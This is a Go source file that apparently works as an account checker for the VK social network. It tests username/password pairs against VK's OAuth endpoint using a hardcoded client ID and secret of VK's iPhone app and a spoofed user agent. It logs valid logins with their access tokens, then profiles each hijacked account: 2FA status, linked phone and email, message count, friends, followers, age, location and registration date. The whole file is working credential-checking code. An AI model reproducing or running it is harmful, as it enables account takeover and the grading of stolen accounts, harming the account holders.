package vk

import (
	"bytes"
	"fmt"
	"github.com/beevik/etree"
	"github.com/google/uuid"
	"github.com/tidwall/gjson"
	"github.com/valyala/fasthttp"
	"log"
	"strings"
	"time"
)

const (
	UA      = "com.vk.vkclient/1554 (iPhone, iOS 14.6, iPhone11,2, Scale/3.0)"
	parseUA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36"
)

type AccountInfo struct {
	ID        int64 //yes
	Friends   int   //yes
	Followers int   //yes
	//Golos        int       //
	TwoFA        bool      //yes
	LinkToPhone  bool      //yes
	LinkToEmail  bool      //yes
	Sex          int8      //yes
	DialogCount  int       //yes
	Age          int       //yes
	Country      string    //yes
	City         string    //yes
	PhoneCountry string    //yes
	RegDate      time.Time //yes
	Profile      bool      //yes
}

func SendLog(username, password string) {
	linkGetToken := fmt.Sprintf("https://api.vk.com/oauth/token?2fa_supported=1&client_id=3140623&client_secret=VeWdmVclDCtn6ihuP1nt&device_id=%s&grant_type=password&password=%s&scope=all&username=%s&v=5.145", uuid.New(), password, username)

	// init request
	req := fasthttp.AcquireRequest()
	defer fasthttp.ReleaseRequest(req)

	// req header set
	req.Header.SetHost("api.vk.com")
	req.Header.SetRequestURI(linkGetToken)
	req.Header.SetContentType("application/x-www-form-urlencoded")
	req.Header.SetUserAgent(UA)
	req.Header.Set("Accept", "*/*")
	req.Header.Set("Accept-Language", "en")
	req.Header.Set("Connection", "keep-alive")

	// init resp
	resp := fasthttp.AcquireResponse()
	defer fasthttp.ReleaseResponse(resp)

	// Perform request
	err := fasthttp.Do(req, resp)
	if err != nil {
		log.Printf("Client get failed: %s\n", err)
		return
	}
	if resp.StatusCode() != fasthttp.StatusOK {
		log.Printf("Expected status code %d but got %d\n", fasthttp.StatusOK, resp.StatusCode())
		return
	}

	if bytes.Contains(resp.Body(), []byte("access_token")) {
		account := AccountInfo{}
		log.Printf("[+] Right account %s:%s\n", username, password)
		token := gjson.Get(string(resp.Body()), "access_token").String()

		usersGet(token, &account, req, resp)
		getMessageCount(token, &account, req, resp)
		accountGetProfileInfo(token, &account, req, resp)
		getInfo(token, &account, req, resp)
		getRegDate(&account, req, resp)

		log.Printf("Token: %s\n", token)
		log.Printf("%+v\n", account)
	}
}

func getAgeFromDate(date string) (int, error) {
	dat, err := time.Parse("2.1.2006", date)
	if err != nil {
		return 0, err
	}
	return int(time.Now().Sub(dat).Hours() / 24 / 365), nil
}

func getCountryCodeFromPhone(phone string) (string, error) {
	phone = strings.TrimSpace(phone)
	phoneCode := strings.Split(phone, "*")[0]
	return CountryCodeTo[strings.TrimSpace(phoneCode)], nil
}

func getRegDate(info *AccountInfo, req *fasthttp.Request, resp *fasthttp.Response) {
	req.Reset()

	req.Header.SetRequestURI(fmt.Sprintf("https://vk.com/foaf.php?id=%d", info.ID))
	req.Header.SetUserAgent(parseUA)
	req.Header.SetMethod("GET")

	err := fasthttp.Do(req, resp)
	if err != nil {
		log.Printf("getRegDate function post request: %s\n", err)
		return
	}

	doc := etree.NewDocument()
	if err := doc.ReadFromBytes(resp.Body()); err != nil {
		log.Printf("Error on read xml as []bytes: %s", err)
		return
	}

	root := doc.SelectElement("rdf:RDF")
	root = root.SelectElement("foaf:Person")

	el := root.SelectElement("ya:created")
	info.RegDate, err = time.Parse(time.RFC3339, el.SelectAttr("dc:date").Value)
	if err != nil {
		log.Printf("Error on parse time from xml: %s", err)
	}
}

func getInfo(token string, info *AccountInfo, req *fasthttp.Request, resp *fasthttp.Response) {
	req.Reset()

	// set req param
	req.Header.SetRequestURI("https://api.vk.com/method/account.getInfo")
	req.SetBody([]byte(fmt.Sprint("&access_token=" + token + "&v=5.131")))
	req.Header.SetUserAgent(parseUA)
	req.Header.SetContentType("application/x-www-form-urlencoded")
	req.Header.SetMethod("POST")

	err := fasthttp.Do(req, resp)
	if err != nil {
		log.Printf("accountGetProfileInfo function post request: %s\n", err)
		return
	}

	body := string(resp.Body())
	// parsing info
	// 1) 2FA
	if res := gjson.Get(body, "response.2fa_required").Int(); res == 0 {
		info.TwoFA = false
	} else {
		info.TwoFA = true
	}
	//2) LinkToEmail
	if res := gjson.Get(body, "response.email_status").String(); res != "confirmed" {
		info.LinkToEmail = false
	} else {
		info.LinkToEmail = true
	}
	//3) LinkToPhone
	if res := gjson.Get(body, "response.phone_status").String(); res != "validated" {
		info.LinkToPhone = false
	} else {
		info.LinkToPhone = true
	}
}

func accountGetProfileInfo(token string, info *AccountInfo, req *fasthttp.Request, resp *fasthttp.Response) {
	req.Reset()

	// set req param
	req.Header.SetRequestURI("https://api.vk.com/method/account.getProfileInfo")
	req.SetBody([]byte(fmt.Sprint("&access_token=" + token + "&v=5.131")))
	req.Header.SetUserAgent(parseUA)
	req.Header.SetContentType("application/x-www-form-urlencoded")
	req.Header.SetMethod("POST")

	err := fasthttp.Do(req, resp)
	if err != nil {
		log.Printf("accountGetProfileInfo function post request: %s\n", err)
		return
	}

	body := string(resp.Body())
	// parsing info
	info.ID = gjson.Get(body, "response.id").Int()
	info.Age, err = getAgeFromDate(gjson.Get(body, "response.bdate").String())
	info.Country = gjson.Get(body, "response.country.title").String()
	info.City = gjson.Get(body, "response.city.title").String()
	info.Sex = int8(gjson.Get(body, "response.sex").Int())
	info.PhoneCountry, err = getCountryCodeFromPhone(gjson.Get(body, "response.phone").String())
	if err != nil {
		log.Println("Error on parsing phone country: ", err)
	}
}

func getMessageCount(token string, info *AccountInfo, req *fasthttp.Request, resp *fasthttp.Response) {
	req.Reset()

	// set req param
	req.Header.SetRequestURI("https://api.vk.com/method/messages.getConversations")
	req.SetBody([]byte(fmt.Sprint("count=0&extended=0&access_token=" + token + "&v=5.131")))
	req.Header.SetUserAgent(parseUA)
	req.Header.SetContentType("application/x-www-form-urlencoded")
	req.Header.SetMethod("POST")

	err := fasthttp.Do(req, resp)
	if err != nil {
		log.Printf("getMessageCount function post request: %s\n", err)
		return
	}

	body := string(resp.Body())
	// parsing info
	info.DialogCount = int(gjson.Get(body, "response.count").Int())
}

func usersGet(token string, info *AccountInfo, req *fasthttp.Request, resp *fasthttp.Response) {
	req.Reset()
	// set req param
	req.Header.SetRequestURI("https://api.vk.com/method/users.get")
	req.SetBody([]byte(fmt.Sprint("fields=counters%2C+city%2C+country%2C+bdate%2C+sex&access_token=" + token + "&v=5.131")))
	req.Header.SetUserAgent(parseUA)
	req.Header.SetContentType("application/x-www-form-urlencoded")
	req.Header.SetMethod("POST")

	err := fasthttp.Do(req, resp)
	if err != nil {
		log.Printf("UsersGet function post request: %s\n", err)
		return
	}

	body := string(resp.Body())

	// parsing info
	info.Friends = int(gjson.Get(body, "response.0.counters.friends").Int())
	info.Followers = int(gjson.Get(body, "response.0.counters.followers").Int())
	info.Sex = int8(gjson.Get(body, "response.0.sex").Int())
	info.Age, err = getAgeFromDate(gjson.Get(body, "response.0.bdate").String())
	if err != nil {
		log.Println("Error on parsing date: ", err)
	}
	info.Profile = gjson.Get(body, "response.0.is_closed").Bool()
}
